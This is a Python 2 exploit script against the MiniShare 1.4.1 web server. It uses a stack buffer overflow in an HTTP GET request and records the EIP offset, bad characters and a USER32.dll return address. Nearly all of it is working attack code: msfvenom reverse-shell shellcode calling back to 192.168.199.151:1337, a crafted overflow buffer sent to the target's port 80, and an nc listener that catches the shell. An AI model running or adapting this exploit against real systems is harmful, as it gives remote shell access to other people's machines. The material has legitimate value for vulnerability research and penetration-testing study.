#!/usr/share/python
#-----------------------------------------------------------------------------------------------------------#
# Software      = MiniShare Version 1.4.1                                                                   #
# Download Link = https://www.exploit-db.com/apps/0ffe5385147edd1f9e7b460c6d7cb0a6-minishare-1.4.1.zip      #
# Date          = 12/18/2017                                                                                #
# Reference     = http://www.securityfocus.com/bid/11620/discuss                                            #
# Author        = @ihack4falafel                                                                            #
# Tested on     = Windows XP SP3 - Professional                                                             #
# EIP Offset    = 1787                                                                                      #
# Badchars      = "\x00\x0d\"                                                                               #
# RET Address   =  0x7e429353 : "\xFF\xE4" | [USER32.dll]                                                   #
# Usage         = python exploit.py <target IP>                                                             #
#-----------------------------------------------------------------------------------------------------------#

import sys
import socket
import time
import struct
import subprocess

#---------------#---------#
W  = '\033[0m'  # White   #
R  = '\033[31m' # Red     #
G  = '\033[32m' # Green   #
O  = '\033[33m' # Orange  #
B  = '\033[34m' # Blue    #
P  = '\033[35m' # Purple  #
C  = '\033[36m' # Cyan    #
M  = '\033[35m' # Magenta #
Y  = '\033[33m' # Yellow  #
#---------------#---------#

if len(sys.argv) < 2:
  print Y+ "Usage               :" + P+  " python exploit.py <target IP>" +W
  print Y+ "Example             :" + P+  " python exploit.py 127.0.0.1  " +W
  sys.exit(0)

HOST = sys.argv[1]

#-----------------------------------------------------------------------------------------------------------#
# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.199.151 LPORT=1337 -b "\x00\x0d" -f python -v payload #
#-----------------------------------------------------------------------------------------------------------#

payload =  ""
payload += "\xda\xd2\xd9\x74\x24\xf4\x58\x2b\xc9\xbb\x06\x2b"
payload += "\x6e\x10\xb1\x52\x31\x58\x17\x03\x58\x17\x83\xee"
payload += "\xd7\x8c\xe5\x12\xcf\xd3\x06\xea\x10\xb4\x8f\x0f"
payload += "\x21\xf4\xf4\x44\x12\xc4\x7f\x08\x9f\xaf\xd2\xb8"
payload += "\x14\xdd\xfa\xcf\x9d\x68\xdd\xfe\x1e\xc0\x1d\x61"
payload += "\x9d\x1b\x72\x41\x9c\xd3\x87\x80\xd9\x0e\x65\xd0"
payload += "\xb2\x45\xd8\xc4\xb7\x10\xe1\x6f\x8b\xb5\x61\x8c"
payload += "\x5c\xb7\x40\x03\xd6\xee\x42\xa2\x3b\x9b\xca\xbc"
payload += "\x58\xa6\x85\x37\xaa\x5c\x14\x91\xe2\x9d\xbb\xdc"
payload += "\xca\x6f\xc5\x19\xec\x8f\xb0\x53\x0e\x2d\xc3\xa0"
payload += "\x6c\xe9\x46\x32\xd6\x7a\xf0\x9e\xe6\xaf\x67\x55"
payload += "\xe4\x04\xe3\x31\xe9\x9b\x20\x4a\x15\x17\xc7\x9c"
payload += "\x9f\x63\xec\x38\xfb\x30\x8d\x19\xa1\x97\xb2\x79"
payload += "\x0a\x47\x17\xf2\xa7\x9c\x2a\x59\xa0\x51\x07\x61"
payload += "\x30\xfe\x10\x12\x02\xa1\x8a\xbc\x2e\x2a\x15\x3b"
payload += "\x50\x01\xe1\xd3\xaf\xaa\x12\xfa\x6b\xfe\x42\x94"
payload += "\x5a\x7f\x09\x64\x62\xaa\x9e\x34\xcc\x05\x5f\xe4"
payload += "\xac\xf5\x37\xee\x22\x29\x27\x11\xe9\x42\xc2\xe8"
payload += "\x7a\xad\xbb\x35\xed\x45\xbe\xb9\x17\xaf\x37\x5f"
payload += "\x7d\xdf\x11\xc8\xea\x46\x38\x82\x8b\x87\x96\xef"
payload += "\x8c\x0c\x15\x10\x42\xe5\x50\x02\x33\x05\x2f\x78"
payload += "\x92\x1a\x85\x14\x78\x88\x42\xe4\xf7\xb1\xdc\xb3"
payload += "\x50\x07\x15\x51\x4d\x3e\x8f\x47\x8c\xa6\xe8\xc3"
payload += "\x4b\x1b\xf6\xca\x1e\x27\xdc\xdc\xe6\xa8\x58\x88"
payload += "\xb6\xfe\x36\x66\x71\xa9\xf8\xd0\x2b\x06\x53\xb4"
payload += "\xaa\x64\x64\xc2\xb2\xa0\x12\x2a\x02\x1d\x63\x55"
payload += "\xab\xc9\x63\x2e\xd1\x69\x8b\xe5\x51\x99\xc6\xa7"
payload += "\xf0\x32\x8f\x32\x41\x5f\x30\xe9\x86\x66\xb3\x1b"
payload += "\x77\x9d\xab\x6e\x72\xd9\x6b\x83\x0e\x72\x1e\xa3"
payload += "\xbd\x73\x0b"

#----------------------------#
#      Buffer Structure      #
#----------------------------#
# buffer = AAA...........AAA #
# buffer = EIP - RET Address #
# buffer = NOPSled           #
# buffer = payload           #
# buffer = BBB...........BBB #
#----------------------------#

buffer  = "GET "
buffer += "A" * 1787
buffer += struct.pack('<L', 0x7e429353)
buffer += "\x90" * 40
buffer += payload
buffer += "B" * (2500-4-1787-4-40-len(payload)-13)
buffer += " HTTP/1.1\r\n\r\n"

try:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((HOST, 80))
  print G+ "[+]" +W + " Connected to MiniShare Server with IP: %s and port: 80" %(HOST)
  print G+ "[+]" +W + " Sending %s bytes of evil payload" %len(buffer)
  time.sleep(1)
  s.send(buffer)
  print G+ "[+]" + P+ " Incoming shell on port 1337" + Y+ " <(^,^)>" +W
  subprocess.call(['nc -lnvp 1337'], shell=True)
except Exception,msg:
  print R+ "[-]" + P+ " Could not connect to MiniShare Server" + Y+ " (._.)" +W
sys.exit(0)

